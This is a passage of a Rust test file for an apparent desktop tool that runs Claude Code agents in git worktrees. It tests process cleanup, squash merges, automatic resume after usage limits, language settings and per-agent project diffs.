        let mut fx = crate::agent::Effects::default();
        for frame in [
            json!({"type":"stream_event","event":{"type":"message_start","message":{"id":"m1","usage":{}}},"parent_tool_use_id":null}),
            json!({"type":"assistant","message":{"id":"m2","content":[{"type":"text","text":"Début."},{"type":"tool_use","id":"t1","name":"Read","input":{"file_path":"src/app.ts"}}]},"parent_tool_use_id":null}),
        ] {
            rt.handle_frame(&frame, &mut fx);
        }
        assert_eq!(rt.view().activity.as_deref(), Some("Lit src/app.ts"));
    }

    h.core.archive_agent(&id, true).await.unwrap();

    let mut rt = agent.lock();
    assert_eq!(rt.view().activity, None);
    // The text of the abandoned turn does not leak into a later one's.
    let mut fx = crate::agent::Effects::default();
    rt.handle_frame(
        &json!({"type":"result","subtype":"success","is_error":false,"duration_ms":1,"result":"Résumé"}),
        &mut fx,
    );
    assert_eq!(
        fx.turn_end,
        Some(crate::board::TurnEnd::Finished("Résumé".into()))
    );
    // What the interface shows follows.
    let events = h.events.lock();
    let shown = events
        .iter()
        .rev()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .expect("the agent was sent to the interface");
    assert_eq!(shown["agent"]["activity"], Value::Null);
}

#[tokio::test]
async fn a_message_after_a_crash_restarts_claude() {
    let h = harness("crash");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "crash".into(), vec![])
        .await
        .unwrap();
    h.wait("crash", |h| h.agent(&id).status == AgentStatus::Error)
        .await;
    h.turn(&id, "Bonjour").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
}

#[tokio::test]
async fn an_unknown_session_is_replaced_and_the_message_still_delivered() {
    let h = harness("stale");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        if let Some(p) = rt.detach() {
            p.kill();
        }
        rt.meta.session_id = Some("missing-123".into());
    }
    h.turn(&id, "Bonjour").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(h
        .items(&id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    assert_ne!(h.agent(&id).session_id.as_deref(), Some("missing-123"));
}

#[tokio::test]
async fn interrupting_an_idle_agent_does_not_swallow_the_next_notification() {
    let h = harness("interrupt");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.ensure_process(&id).await.unwrap();
    h.core.interrupt(&id).await.unwrap();
    assert!(!h.core.agent(&id).unwrap().lock().interrupted);
}

#[tokio::test]
async fn killing_an_agent_kills_its_whole_process_tree() {
    let h = harness("tree");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "grandchild").await;
    let text = h
        .items(&id)
        .iter()
        .rev()
        .find(|i| i["kind"] == "text")
        .unwrap()["text"]
        .as_str()
        .unwrap()
        .to_string();
    let pid: u32 = text.trim_start_matches("pid:").parse().unwrap();
    assert!(process_exists(pid));
    h.core.delete_agent(&id, false).await.unwrap();
    for _ in 0..100 {
        if !process_exists(pid) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("grandchild {pid} survived the agent");
}

/// A start that took the agent before its deletion and the lock after it (the deletion drops its
/// lock when it is over) would run claude, unseen, in the folder that goes.
#[tokio::test]
async fn a_start_that_waited_for_the_lock_of_a_deleted_agent_starts_nothing() {
    let h = harness("start-deleted");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let handle = h.core.agent(&id).unwrap();
    h.core.delete_agent(&id, false).await.unwrap();
    let started = h.core.start_process_of(&handle, &id).await;
    assert_eq!(started.err().unwrap().to_string(), "agent introuvable");
    assert!(handle.lock().proc.is_none());
}

/// The warm-up of a new agent comes as late as the runtime lets it: archived meanwhile, it would
/// start a process nothing closes, which holds the folder of the agent's worktree (on Windows, its
/// cleanup then failed after minutes).
#[tokio::test]
async fn the_warm_up_of_an_agent_archived_meanwhile_starts_nothing() {
    let h = harness("warm-archived");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.archive_agent(&id, true).await.unwrap();
    let handle = h.core.agent(&id).unwrap();
    // The warm-up the creation made, if it was not through yet, and one made now.
    let warmed = h.core.ensure_process_for(&id, true).await;
    assert_eq!(warmed.err().unwrap().to_string(), "L’agent est archivé.");
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(handle.lock().proc.is_none());
}

#[cfg(windows)]
fn process_exists(pid: u32) -> bool {
    let out = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout).contains(&pid.to_string())
}

/// Running (a zombie waiting for its parent to reap it is not).
#[cfg(unix)]
fn process_exists(pid: u32) -> bool {
    let out = Command::new("ps")
        .args(["-o", "stat=", "-p", &pid.to_string()])
        .output()
        .unwrap();
    let stat = String::from_utf8_lossy(&out.stdout);
    out.status.success() && !stat.trim().is_empty() && !stat.trim().starts_with('Z')
}

#[tokio::test]
async fn a_worktree_agent_works_on_an_escouade_branch() {
    let h = harness("wt-prefix");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.expect("worktree created");
    let name = wt.branch.strip_prefix("escouade/").expect(&wt.branch);
    assert!(
        wt.path
            .ends_with(&format!("worktrees{}{name}", std::path::MAIN_SEPARATOR)),
        "{}",
        wt.path
    );
}

#[tokio::test]
async fn deleting_an_agent_removes_its_worktree_and_branch() {
    let h = harness("delete-wt");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().expect("worktree created");
    assert!(Path::new(&wt.path).is_dir());
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(!Path::new(&wt.path).exists());
    assert_eq!(git(&r, &["branch", "--list", &wt.branch]), "");
    assert_eq!(h.removed_events(&a.meta.id), 1);
}

#[tokio::test]
async fn an_agent_stopped_by_the_usage_limit_is_sent_continue_once_it_resets() {
    let h = harness("auto-resume");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    // Not due yet: nothing sent.
    h.core.plan_resume(&id, Some(now_ms() + 3_600_000));
    let at = h.agent(&id).resume_at.expect("a resume is planned");
    assert!(at > now_ms() + 3_600_000, "with a margin after the reset");
    h.core.resume_due().await;
    assert!(h.agent(&id).resume_at.is_some());
    // The planned time has come.
    h.core.agent(&id).unwrap().lock().meta.resume_at = Some(now_ms() - 1_000);
    h.core.resume_due().await;
    h.wait("continue sent", |h| {
        h.items(&id)
            .iter()
            .any(|i| i["kind"] == "user" && i["text"] == "continue")
    })
    .await;
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn nothing_is_planned_without_a_reset_still_to_come() {
    let h = harness("auto-resume-none");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // No reset told, no full window: a passing rate limit of the server's.
    h.core.plan_resume(&id, None);
    assert_eq!(h.agent(&id).resume_at, None);
    // A reset already passed (an old reading): retrying would only meet the limit again.
    h.core.plan_resume(&id, Some(now_ms() - 60_000));
    assert_eq!(h.agent(&id).resume_at, None);
    let full_before = Some(RateWindow {
        pct: 100.0,
        resets_at: Some(now_ms() - 60_000),
    });
    h.core
        .record_usage("principal", Reading::claude((full_before, None)));
    h.core.plan_resume(&id, None);
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn a_planned_resume_skips_archived_or_busy_agents_and_stops_when_turned_off() {
    let h = harness("auto-resume-skip");
    let (p, _) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let b = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let due = || Some(now_ms() - 1_000);
    // Archived: its planned resume goes with it.
    h.core.plan_resume(&a, Some(now_ms() + 3_600_000));
    h.core.archive_agent(&a, true).await.unwrap();
    assert_eq!(h.agent(&a).resume_at, None);
    h.core.agent(&a).unwrap().lock().meta.resume_at = due();
    // Busy: its turn goes on.
    {
        let hb = h.core.agent(&b).unwrap();
        let mut rt = hb.lock();
        rt.meta.status = AgentStatus::Running;
        rt.meta.resume_at = due();
    }
    h.core.resume_due().await;
    assert!(h.agent(&a).resume_at.is_some() && h.agent(&b).resume_at.is_some());
    assert!(!h.items(&a).iter().any(|i| i["text"] == "continue"));
    // Turned off: planned resumes are dropped, and none is sent.
    h.core.agent(&b).unwrap().lock().meta.status = AgentStatus::Error;
    let off = Settings {
        auto_resume: false,
        ..h.core.settings.read().clone()
    };
    h.core.save_settings(off).unwrap();
    assert_eq!(h.agent(&b).resume_at, None);
    h.core.agent(&b).unwrap().lock().meta.resume_at = due();
    h.core.resume_due().await;
    assert!(h.agent(&b).resume_at.is_some());
}

#[tokio::test]
async fn a_change_of_language_is_told_to_the_window_and_another_setting_is_not() {
    use crate::i18n::{Lang::*, LangInfo};
    let h = harness("settings-language-event");
    let told = |h: &Harness| -> Vec<Value> {
        h.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "language")
            .cloned()
            .collect()
    };
    let save = |change: &dyn Fn(&mut Settings)| {
        let mut s = h.core.settings.read().clone();
        change(&mut s);
        h.core.save_settings(s).unwrap();
    };
    // Saved before the languages: the system's (French in tests), Claude's that of the interface.
    let french = LangInfo {
        ui: Fr,
        system: Fr,
        claude: Fr,
    };
    assert_eq!(h.core.lang(), french);
    save(&|s| s.sound = true);
    assert!(told(&h).is_empty());
    // The interface in English: the texts for Claude follow it.
    save(&|s| s.language = "en".into());
    let english =
        json!({ "type": "language", "lang": { "ui": "en", "system": "fr", "claude": "en" } });
    assert_eq!(told(&h), vec![english.clone()]);
    assert_eq!(
        h.core.lang(),
        LangInfo {
            ui: En,
            system: Fr,
            claude: En
        }
    );
    // Claude's texts in French, the interface staying English.
    save(&|s| s.claude_language = "fr".into());
    let mixed =
        json!({ "type": "language", "lang": { "ui": "en", "system": "fr", "claude": "fr" } });
    assert_eq!(told(&h), vec![english.clone(), mixed.clone()]);
    // Back to the system's, which is French, then French by name: only the first changes anything.
    save(&|s| {
        s.language = "system".into();
        s.claude_language = "ui".into();
    });
    save(&|s| s.language = "fr".into());
    let french_again =
        json!({ "type": "language", "lang": { "ui": "fr", "system": "fr", "claude": "fr" } });
    assert_eq!(told(&h), vec![english, mixed, french_again]);
    assert_eq!(h.core.lang(), french);
    // The native menus are written again when the interface's language changes, not for Claude's.
    assert_eq!(*h.core.relabels.lock(), [En, Fr]);
    // The tests beside this one still write French.
    assert_eq!(crate::i18n::ui(), Fr);
}

#[tokio::test]
async fn a_turn_stopped_by_the_usage_limit_plans_the_resume_at_its_reset() {
    let h = harness("auto-resume-limit");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "la limite".into(), vec![])
        .await
        .unwrap();
    h.wait("resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let at = h.agent(&id).resume_at.unwrap();
    // The fake CLI's reset is in an hour.
    let hour = now_ms() + 3_600_000;
    assert!(at > hour - 5_000 && at < hour + 60_000, "{at} vs {hour}");
    assert_eq!(h.agent(&id).status, AgentStatus::Error);
}

#[tokio::test]
async fn a_resume_takes_the_saturated_window_s_reset_and_can_be_turned_off_or_cancelled() {
    let h = harness("auto-resume-plan");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Claude Code did not tell the reset: the full window's (of its account).
    let reset = now_ms() + 7_200_000;
    let full = Some(RateWindow {
        pct: 100.0,
        resets_at: Some(reset),
    });
    h.core
        .record_usage("principal", Reading::claude((full, None)));
    h.core.plan_resume(&id, None);
    let at = h.agent(&id).resume_at.expect("planned from the window");
    assert!(at > reset && at < reset + 120_000, "{at} vs {reset}");
    h.core.cancel_resume(&id).unwrap();
    assert_eq!(h.agent(&id).resume_at, None);
    // Off in the settings: nothing planned.
    h.core.settings.write().auto_resume = false;
    h.core.plan_resume(&id, Some(reset));
    assert_eq!(h.agent(&id).resume_at, None);
}

#[tokio::test]
async fn the_running_claude_processes_are_counted_with_their_memory() {
    let h = harness("resources");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    // The fake CLI: cmd.exe (Windows) or sh, then the node it starts.
    h.wait("node in the job", |h| {
        h.core.sample_resources().memory > 10 * 1024 * 1024
    })
    .await;
    let r = h.core.sample_resources();
    assert_eq!(r.instances, 1);
    assert_eq!(r.agents.len(), 1);
    assert_eq!(r.agents[0].id, id);
    if let Some(proc) = h.core.agent(&id).unwrap().lock().detach() {
        proc.kill();
    }
    assert_eq!(h.core.sample_resources().instances, 0);
}

/// Removes the worktree of an agent whose process was just killed, once that process let go of
/// it: under Windows a folder a process still has open (its current folder) cannot go, and a
/// process killed under load is gone some time later.
async fn remove_once_let_go(dir: impl AsRef<Path>) {
    let dir = dir.as_ref();
    let start = std::time::Instant::now();
    loop {
        match std::fs::remove_dir_all(dir) {
            Ok(()) => return,
            Err(e) => assert!(
                start.elapsed() < Duration::from_secs(30),
                "{} not removed: {e}",
                dir.display()
            ),
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

#[tokio::test]
async fn deleting_an_agent_whose_worktree_vanished_still_removes_it() {
    let h = harness("delete-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    remove_once_let_go(&wt.path).await;
    h.core.delete_agent(&a.meta.id, true).await.unwrap();
    assert!(h.core.agent(&a.meta.id).is_err());
    assert_eq!(h.removed_events(&a.meta.id), 1);
}

/// Commits `content` into src/app.ts of `dir`.
pub(crate) fn commit_change(dir: &Path, content: &str, msg: &str) {
    std::fs::write(dir.join("src").join("app.ts"), content).unwrap();
    git(
        dir,
        &[
            "-c",
            "user.email=t@t",
            "-c",
            "user.name=t",
            "commit",
            "-qam",
            msg,
        ],
    );
}

#[tokio::test]
async fn merging_refuses_a_dirty_main_checkout() {
    let h = harness("merge-dirty");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    std::fs::write(r.join("src").join("app.ts"), "const a = 99; // wip\n").unwrap();
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("non commit"), "{err}");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 99; // wip\n"
    );
}

#[tokio::test]
async fn a_conflicting_squash_merge_leaves_the_main_checkout_clean() {
    let h = harness("merge-conflict");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    commit_change(&r, "const a = 3;\n", "main change");
    assert!(h.core.merge_agent(&a.meta.id, true, false).await.is_err());
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 3;\n"
    );
}

#[tokio::test]
async fn a_clean_squash_merge_lands_one_commit() {
    let h = harness("merge-ok");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    h.core.merge_agent(&a.meta.id, true, false).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "HEAD"]), "2");
}

#[tokio::test]
async fn merging_is_refused_with_a_typed_error_when_the_project_is_not_on_the_base() {
    let h = harness("merge-other-branch");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-qc", "other"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    let refused = err.downcast_ref::<NotOnBase>().expect("a typed refusal");
    assert_eq!(
        (refused.current.as_str(), refused.base.as_str()),
        ("other", "main")
    );
    assert_eq!(refused.wire(), "NOT_ON_BASE:other:main");
    // Neither the branch the project is on nor the agent's base got the agent's commits.
    assert_eq!(git(&r, &["branch", "--show-current"]), "other");
    assert_eq!(git(&r, &["rev-list", "--count", "other"]), "1");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "1");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 1;\n"
    );
}

#[tokio::test]
async fn a_detached_head_is_not_the_base_either() {
    let h = harness("merge-detached");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-q", "--detach"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    assert_eq!(
        err.downcast_ref::<NotOnBase>().unwrap().wire(),
        "NOT_ON_BASE::main"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "1");
}

#[tokio::test]
async fn merging_can_switch_the_project_to_the_base_first() {
    let h = harness("merge-switch");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["switch", "-qc", "other"]);
    h.core.merge_agent(&a.meta.id, true, true).await.unwrap();
    assert_eq!(git(&r, &["branch", "--show-current"]), "main");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "2");
    assert_eq!(git(&r, &["log", "-1", "--format=%s", "main"]), "agent-1");
    // The squash lists the agent's commits, counted from the base.
    assert!(
        git(&r, &["log", "-1", "--format=%b", "main"]).contains("- agent change"),
        "{}",
        git(&r, &["log", "-1", "--format=%b", "main"])
    );
    assert_eq!(git(&r, &["rev-list", "--count", "other"]), "1");
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
}

#[tokio::test]
async fn a_switch_git_refuses_is_reported_as_it_is_and_merges_nothing() {
    let h = harness("merge-switch-refused");
    let (p, r) = h.project(true).await;
    git(&r, &["branch", "other"]);
    // main has a file that `other` lacks.
    std::fs::write(r.join("only-on-main.txt"), "tracked\n").unwrap();
    git(&r, &["add", "only-on-main.txt"]);
    git(&r, &["commit", "-qm", "a file of main"]);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    // On `other` the file is gone; the user's own, untracked, takes its place: switching to main
    // would overwrite it.
    git(&r, &["switch", "-q", "other"]);
    std::fs::write(r.join("only-on-main.txt"), "the user's\n").unwrap();
    let err = h
        .core
        .merge_agent(&a.meta.id, true, true)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_none());
    assert!(format!("{err:#}").contains("only-on-main.txt"), "{err:#}");
    assert_eq!(git(&r, &["branch", "--show-current"]), "other");
    assert_eq!(git(&r, &["rev-list", "--count", "main"]), "2");
    assert_eq!(
        std::fs::read_to_string(r.join("only-on-main.txt")).unwrap(),
        "the user's\n"
    );
}

#[tokio::test]
async fn a_base_branch_that_is_gone_is_said_and_nothing_is_merged() {
    let h = harness("merge-base-gone");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    commit_change(
        Path::new(&a.meta.worktree.as_ref().unwrap().path),
        "const a = 2;\n",
        "agent change",
    );
    git(&r, &["branch", "-m", "main", "trunk"]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, true)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_none());
    assert!(
        err.to_string().contains("La branche de base « main »"),
        "{err:#}"
    );
    assert_eq!(git(&r, &["rev-list", "--count", "trunk"]), "1");
}

#[tokio::test]
async fn a_branch_the_folders_branch_already_holds_still_has_to_go_into_the_base() {
    let h = harness("merge-held-elsewhere");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    commit_change(Path::new(&wt.path), "const a = 2;\n", "agent change");
    // `other` got the agent's commit (counted from HEAD, nothing would be left to merge).
    git(&r, &["switch", "-qc", "other"]);
    git(&r, &["merge", "-q", "--ff-only", &wt.branch]);
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<NotOnBase>().is_some(), "{err:#}");
}

#[tokio::test]
async fn what_there_is_to_merge_is_counted_from_the_base_not_from_head() {
    let h = harness("merge-count-from-base");
    let (p, r) = h.project(true).await;
    // A branch left behind at the first commit, which the project's folder then sits on.
    git(&r, &["branch", "behind"]);
    commit_change(&r, "const a = 2;\n", "main moves on");
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    git(&r, &["switch", "-q", "behind"]);
    // The agent has no commit of its own: HEAD lacks "main moves on", its base has it.
    let err = h
        .core
        .merge_agent(&a.meta.id, true, false)
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("Rien à merger"), "{err}");
    assert_eq!(git(&r, &["rev-list", "--count", "behind"]), "1");
}

#[tokio::test]
async fn the_git_log_shows_every_agent_branch_and_which_one_is_the_agents() {
    let h = harness("git-log");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    commit_change(Path::new(&wt.path), "const a = 2;\n", "agent change");

    let log = h
        .core
        .git_log(&p.id, Some(a.meta.id.clone()), None)
        .await
        .unwrap();
    assert_eq!(log.head.as_deref(), Some(wt.branch.as_str()));
    let c = log
        .commits
        .iter()
        .find(|c| c.subject == "agent change")
        .expect("agent commit listed");
    assert!(c.refs.contains(&wt.branch), "{:?}", c.refs);
    assert_eq!(
        h.core
            .git_log(&p.id, None, None)
            .await
            .unwrap()
            .head
            .as_deref(),
        Some("main")
    );

    let patch = h.core.git_show(&p.id, &c.hash, None).await.unwrap();
    assert!(patch.contains("+const a = 2;"), "{patch}");
}

#[tokio::test]
async fn a_file_is_discarded_and_read_in_the_checkout_that_holds_it() {
    let h = harness("core-git-discard");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();

    let id = Some(a.meta.id.clone());
    // Each row says which checkout it comes from.
    let mut rows: Vec<(String, Option<String>, bool)> = h
        .core
        .git_files(&p.id, None)
        .await
        .unwrap()
        .into_iter()
        .map(|f| (f.path, f.agent_id, f.in_worktree))
        .collect();
    rows.sort();
    assert_eq!(
        rows,
        vec![
            ("new.ts".into(), id.clone(), true),
            ("src/app.ts".into(), None, false),
            ("src/app.ts".into(), id.clone(), true),
        ]
    );
    // Each checkout is read where it is.
    let (root, _) = h.core.edit_root(&p.id, id.clone()).await.unwrap();
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 3;\n"));
    let (root, _) = h.core.edit_root(&p.id, None).await.unwrap();
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 2;\n"));

    h.core
        .git_discard(&p.id, id.clone(), "new.ts")
        .await
        .unwrap();
    h.core.git_discard(&p.id, id, "src/app.ts").await.unwrap();
    assert!(!wt.join("new.ts").exists());
    assert_eq!(
        std::fs::read_to_string(wt.join("src").join("app.ts")).unwrap(),
        "const a = 1;\n"
    );
    // The project's own checkout is untouched until discarded there.
    assert_eq!(
        std::fs::read_to_string(r.join("src").join("app.ts")).unwrap(),
        "const a = 2;\n"
    );
    h.core.git_discard(&p.id, None, "src/app.ts").await.unwrap();
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
}

#[tokio::test]
async fn the_project_diff_covers_the_checkout_and_each_agents_worktree() {
    let h = harness("core-project-diff");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    // The same file edited in both checkouts, and a file only the agent has.
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    let owners: Vec<_> = parts
        .iter()
        .map(|d| (d.agent_id.clone(), d.in_worktree))
        .collect();
    let id = Some(a.meta.id.clone());
    assert_eq!(owners.len(), 2, "{owners:?}");
    assert!(owners.contains(&(None, false)), "{owners:?}");
    assert!(owners.contains(&(id.clone(), true)), "{owners:?}");

    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    // The project's checkout shows its own edit only.
    let project_diff = &of(None).diff;
    assert!(project_diff.contains("+const a = 2;"), "{project_diff}");
    assert!(!project_diff.contains("+const a = 3;"), "{project_diff}");
    assert!(!project_diff.contains("new.ts"), "{project_diff}");
    // The agent's worktree shows both of its files, as the list does.
    let agent_diff = &of(id).diff;
    assert!(agent_diff.contains("+const a = 3;"), "{agent_diff}");
    assert!(agent_diff.contains("+++ b/new.ts"), "{agent_diff}");
    assert!(!agent_diff.contains("+const a = 2;"), "{agent_diff}");
}

#[tokio::test]
async fn the_project_diff_credits_checkout_files_to_the_agent_that_edited_them() {
    let h = harness("core-project-diff-owners");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake reports src/app.ts as edited by the agent
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("notes.md"), "x\n").unwrap();

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    assert!(parts.iter().all(|d| !d.in_worktree));
    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    let credited = &of(Some(id)).diff;
    assert!(credited.contains("+const a = 2;"), "{credited}");
    assert!(!credited.contains("notes.md"), "{credited}");
    let uncredited = &of(None).diff;
    assert!(uncredited.contains("+++ b/notes.md"), "{uncredited}");
    assert!(!uncredited.contains("src/app.ts"), "{uncredited}");
}

/// `n` new files with long names under `dir/generated`: listing all of them on one command line
/// overflows what Windows accepts (about 32,000 characters).
fn write_many_files(dir: &Path, n: usize) {
    let folder = dir.join("generated");
    std::fs::create_dir_all(&folder).unwrap();
    for i in 0..n {
        let name = format!("a-rather-long-generated-file-name-{i:04}.txt");
        std::fs::write(folder.join(name), "x\n").unwrap();
    }
}

#[tokio::test]
async fn the_project_diff_of_a_worktree_with_hundreds_of_new_files_keeps_its_edits() {
    let h = harness("core-project-diff-many-worktree");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    write_many_files(&wt, 800);

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    assert_eq!(parts.len(), 1);
    // The edit of a tracked file is still there, and so is the last of the new files.
    let diff = &parts[0].diff;
    assert!(
        diff.contains("+const a = 3;"),
        "{}",
        &diff[..diff.len().min(300)]
    );
    assert!(diff.contains("a-rather-long-generated-file-name-0799.txt"));
}

#[tokio::test]
async fn the_project_diff_of_a_checkout_split_between_owners_keeps_the_edits_among_hundreds_of_new_files(
) {
    let h = harness("core-project-diff-many-checkout");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("lib.ts"), "export {};\n").unwrap();
    git(&r, &["add", "lib.ts"]);
    git(&r, &["commit", "-qm", "lib"]);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake reports src/app.ts as edited by the agent
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("lib.ts"), "export const b = 1;\n").unwrap();
    write_many_files(&r, 800);

    let parts = h.core.git_project_diff(&p.id).await.unwrap();
    let of = |agent: Option<String>| parts.iter().find(|d| d.agent_id == agent).unwrap();
    let credited = &of(Some(id)).diff;
    assert!(credited.contains("+const a = 2;"), "{credited}");
    assert!(!credited.contains("lib.ts"));
    // No agent edited lib.ts or the new files: they share one part, hundreds of paths long.
    let rest = &of(None).diff;
    assert!(
        rest.contains("+export const b = 1;"),
        "{}",
        &rest[..rest.len().min(300)]
    );
    assert!(rest.contains("a-rather-long-generated-file-name-0799.txt"));
